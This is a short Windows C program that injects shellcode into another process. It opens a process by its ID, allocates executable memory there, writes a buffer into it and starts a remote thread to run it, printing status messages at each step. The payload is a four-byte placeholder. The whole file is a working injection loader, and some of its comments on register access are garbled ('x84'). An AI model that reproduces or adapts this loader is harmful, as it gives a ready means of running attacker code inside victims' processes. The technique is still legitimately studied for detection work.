#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD dwPID, dwTID = 0;
PVOID pvBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellcode[] = "\x41\x41\x41\x41";
size_t shellcodesize = sizeof(shellcode);


int main(int argc, char* argv[]){

    if (argc < 2){
        printf("%s usage: %s <PID>", e, argv[0]);
        return 1;
    }
    dwPID = atoi(argv[1]);
    printf("%s trying to open a handle to process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

    if (hProcess == NULL){
        printf("%s couldn't get handle to the process(%d), error: %ld", e, dwPID, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }

        printf("%s got handle to the process!\n\\---0x%p\n", k, hProcess);

    /* allocate bytes to process memory */
    pvBuffer = VirtualAllocEx(hProcess, NULL, shellcodesize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, shellcodesize);

    if (pvBuffer == NULL){
        printf("%s couldn't create buffer of the process(%d), error: %ld", e, dwPID, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }

    /* actually write the allocated memory to process memory */
    WriteProcessMemory(hProcess, pvBuffer, shellcode, shellcodesize, NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, shellcodesize);

    /* create thread to run our payload */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvBuffer, NULL, 0, 0, &dwTID);
    if (hThread == NULL){
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        /* Note that GetLastError() reads the same value as NtCurrentTeb() 
           The register acessed is GS:[30h] on x64 or FS:[60h] on x84
        */
        return 1;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, dwTID, hThread);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished!\n", k);


    return 0;
}